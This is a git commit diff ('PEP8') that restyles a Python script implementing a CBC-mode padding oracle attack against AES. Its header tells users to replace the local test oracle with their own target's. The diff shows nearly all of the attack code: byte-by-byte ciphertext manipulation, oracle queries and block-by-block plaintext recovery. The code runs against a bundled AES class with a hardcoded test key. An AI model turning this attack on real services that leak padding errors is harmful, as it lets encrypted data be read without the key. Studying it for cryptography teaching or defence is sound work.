276ac94a52d7bac16281acb04afe6be5e8a7d6cd
shalevos <shalev.ke@gmail.com>
2015-12-30 16:29:35 +0200

    PEP8

--- Padding-Oracle-Attack.py
+++ Padding-Oracle-Attack.py
@@ -4,24 +4,26 @@ AES Implementation included for testing.
 For use, replace 'cryptmaster.decrypt()' call with your own padding oracle.
 Notes: Works on CBC mode encryption.
 """
-#For Testing:
+# For Testing:
 from Crypto.Cipher import AES
 from Crypto import Random
-#For base conversions:
+# For base conversions:
 import base64
 import codecs
 
-#Block Size (In bytes):
+# Block Size (In bytes):
 BS = 16
 
 """
 For testing code block.
 This is the Enc/Dec scheme we use as a padding oracle for testing:
 """
-#padding function for AES mode (PKCS5):
+# padding function for AES mode (PKCS5):
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 
-#unpadding function:
+# unpadding function:
+
+
 def unpad(s):
     pad = s[len(s)-1]
     if(pad<=0 or pad > len(s)):
@@ -31,7 +33,9 @@ def unpad(s):
             return False
     return s[:len(s)-pad]
 
-#AES cipher class.
+# AES cipher class.
+
+
 class AESCipher:
     def __init__( self, key ):
         """
@@ -70,49 +74,51 @@ Inputs:
 Output:
     the deciphered value of the byte (as int)
 """
+
+
 def decipherByte(byteIndex,cipherBlock,prevCipherBlock,decipheredBytes=[],blockSize = 16):
     
-    #initialize run variables:
+    # initialize run variables:
     didTwoBytesWork = False
     tailBytes = bytearray()
     i = 1
     
-    #append the correct padding to all bytes after the one we are deciphering:
+    # append the correct padding to all bytes after the one we are deciphering:
     for b in decipheredBytes:
         tailBytes = tailBytes + bytearray([b^int(prevCipherBlock[(byteIndex+i)*2:(byteIndex+i)*2+2],16)^(blockSize-byteIndex)]*1)
         i = i+1
 
-    #the ciphertext byte we are manipulating:
+    # the ciphertext byte we are manipulating:
     byteToManipulate = prevCipherBlock[byteIndex*2:((byteIndex*2)+2)]
 
-    #run on all options for value:
+    # run on all options for value:
     for i in range(0,256):
         
-        #change value of manipulated cipher text:
+        # change value of manipulated cipher text:
         blockToManipulate = prevCipherBlock
         blockToManipulate = blockToManipulate[:(byteIndex*2)]
         blockToManipulate = codecs.decode(blockToManipulate, 'hex_codec')
         blockToManipulate = blockToManipulate+bytearray([i]*1)+tailBytes
         blockToManipulate = codecs.encode(blockToManipulate, 'hex_codec')
         
-        #send to padding oracle:
+        # send to padding oracle:
         cipherTry = blockToManipulate + cipherBlock
         result = cryptmaster.decrypt(cipherTry)
 
-        #when padding oracle returns true, we know that he believes message to have correct padding:
+        # when padding oracle returns true, we know that he believes message to have correct padding:
         if(result != False):
 
-            #set deciphered byte to correct value:
+            # set deciphered byte to correct value:
             if( blockToManipulate[byteIndex*2:(byteIndex*2)+2] != byteToManipulate ):
 
-                #if not only the original padding worked:
+                # if not only the original padding worked:
                 didTwoBytesWork = True
                 decipheredByte = i^(blockSize-byteIndex)^int(byteToManipulate,16)
                 return decipheredByte
             else:
                 decipheredByte = i^(blockSize-byteIndex)^int(byteToManipulate,16)
 
-    #return result:
+    # return result:
     return decipheredByte
 
 """
@@ -123,7 +129,9 @@ Inputs:
 Output:
     plaintext string of this block:
 """
-def decipherBlock(cipherBlock,prevCipherBlock):
+
+
+def decipherBlock(cipherBlock , prevCipherBlock):
     messageBytes = []
     message = ""
     #run on all bytes in block,from start to end, deciphering:
@@ -142,25 +150,26 @@ if __name__== "__main__":
          and replace all calls to 'cryptmaster.decipher()' in code to your padding oracle.
     """
     
-    #beginning of test code:
+    # beginning of test code:
     key = "140b41b22a29beb4061bda66b6747e14"
-    plaintext = "This attack completely breaks any block cipher using CBC mode, given a padding oracle. Implementation should be switched to more secure modes, such as CTR."
+    plaintext = "This attack completely breaks any block cipher using CBC mode, given a padding oracle." \
+                " Implementation should be switched to more secure modes, such as CTR."
     key=key[:32]
     cryptmaster = AESCipher(key)
     ciphertext = cryptmaster.encrypt(plaintext)
-    #end of test block.
+    # end of test block.
 
-    #-----------------------------------------------------------------------------------#
-    #the attack:                                                                                         #
-    #-----------------------------------------------------------------------------------#
+    # -----------------------------------------------------------------------------------#
+    # the attack:                                                                        #
+    # -----------------------------------------------------------------------------------#
 
-    #split cipher to blocks:
+    # split cipher to blocks:
     cipherBlocks = [ciphertext[i:i+BS*2] for i in range(0, len(ciphertext), BS*2)]
     message = ""
     
-    #go block by block, deciphering and appending to message:
+    # go block by block, deciphering and appending to message:
     for i in range(0,len(cipherBlocks)-1):
         message = message + decipherBlock(cipherBlocks[i+1],cipherBlocks[i])
 
-    #output of message:
+    # output of message:
     print (message)
